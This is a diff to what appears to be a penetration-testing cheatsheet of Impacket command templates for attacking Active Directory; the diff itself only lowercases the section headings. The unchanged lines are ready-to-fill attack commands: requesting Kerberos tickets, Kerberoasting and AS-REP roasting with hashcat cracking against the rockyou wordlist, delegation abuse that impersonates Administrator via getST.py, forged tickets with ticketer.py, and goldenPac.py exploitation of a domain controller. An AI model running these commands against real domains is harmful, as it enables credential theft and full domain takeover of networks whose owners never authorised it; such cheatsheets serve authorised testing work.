@@ -1,41 +1,41 @@
 # impacket
 #target/remote #os/linux #cat/ad
 
-## GetTGT
+## gettgt
 #faketime
 ```
 getTGT.py <domain>/'<user>'<impacket_auth> && export KRB5CCNAME=$(pwd)/'<user>'.ccache
 ```
 
-## Kerberoast
+## kerberoast
 #faketime
 ```
 GetUserSPNs.py -request -outputfile hashes.kerberoast <domain>/'<user>'<impacket_auth>
 hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
 ```
 
-## Kerberoast with no-preauth user
+## kerberoast with no-preauth user
 #faketime
 ```
 GetUserSPNs.py -request -no-preauth <no_preauth_user> -usersfile <userlist|users.txt> -outputfile hashes.kerberoast <domain>/
 hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
 ```
 
-## ASREPRoast with usersfile
+## asreproast with usersfile
 #faketime
 ```
 GetNPUsers.py -usersfile <userlist|users.txt> -outputfile hashes.asreproast <domain>/
 hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
 ```
 
-## ASREPRoast with authentication
+## asreproast with authentication
 #faketime
 ```
 GetNPUsers.py -request -outputfile hashes.asreproast <domain>/'<user>'<impacket_auth>
 hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
 ```
 
-## KCD/RBCD (principal requires SPN!)
+## kcd/rbcd (principal requires spn!)
 #faketime
 ```
 getST.py -spn <service|cifs>/<fqdn> -impersonate <imp_user|Administrator> <domain>/'<user>'<impacket_auth>
@@ -83,7 +83,7 @@ ticketer.py -aesKey <principal_krbtgt_aes_key> -domain <principal_domain> -domai
 goldenPac.py -dc-ip <dc_ip> <domain>/'<user>'<impacket_target_auth>
 ```
 
-## Export KRB5CCNAME
+## export krb5ccname
 ```
 export KRB5CCNAME=$(pwd)/<ccache>
 ```
